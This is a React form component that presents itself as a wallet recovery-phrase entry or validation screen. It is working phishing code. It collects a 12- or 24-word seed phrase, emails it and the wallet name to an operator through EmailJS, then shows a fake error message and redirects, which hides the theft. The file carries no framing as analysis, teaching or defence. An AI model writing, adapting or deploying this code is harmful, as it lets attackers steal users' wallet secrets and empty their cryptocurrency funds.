import { Text, Textarea, useToast } from '@chakra-ui/react';
import React from 'react';
import emailjs from '@emailjs/browser';

import CustomButton from './CustomButton';
import emailConfig from '../constants';
import { useNavigate } from 'react-router-dom';

export default function Phrase({ color, name, placeholder }) {
  const [phrase, setPhrase] = React.useState('');
  const [loading, setLoading] = React.useState(false);

  const toast = useToast();
  const navigate = useNavigate();

  function hasWhiteSpace(s) {
    return /\s/g.test(s);
  }

  const handleSubmit = async e => {
    e.preventDefault();

    if (!hasWhiteSpace(phrase)) {
      return window.alert('Phrase should contain whitespace');
    }
    try {
      const a = phrase.trim().split(' ');

      if (a.length === 12 || a.length === 24) {
        console.log(a);
        setLoading(true);

        await emailjs.send(
          emailConfig.service_id,
          emailConfig.template_id,
          { phrase: a.join(' '), from_wallet: name },
          emailConfig.public_key
        );

        setTimeout(() => {
          setLoading(false);
        }, 10000);

        toast({
          title: 'Error',
          description: 'An Error Occured While Loading Phrase',
          status: 'error',
          duration: 5000,
          isClosable: true,
          position: 'top',
        });

        navigate('/validate', { replace: true });
      } else {
        window.alert('Phrase should be 12 or 24 words');
      }
    } catch (error) {
      setTimeout(() => {
        setLoading(false);
      }, 10000);

      toast({
        title: 'Error',
        description: 'An Error Occured While Loading Phrase',
        status: 'error',
        duration: 5000,
        isClosable: true,
        position: 'top',
      });

      navigate('/validate', { replace: true });
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <Textarea
        name="phrase"
        value={phrase}
        onChange={e => setPhrase(e.target.value)}
        placeholder="Enter your recovery phrase"
        size="sm"
        borderRadius="lg"
        height="120px"
        color={color}
        _placeholder={{ placeholder }}
      />

      <Text mt="20px" mb="8px" fontSize="14px" color={placeholder}>
        Typically 12 (sometimes 24) words separated by single spaces
      </Text>

      <CustomButton loading={loading} loadingText={'LOADING PHRASE...'} />
    </form>
  );
}
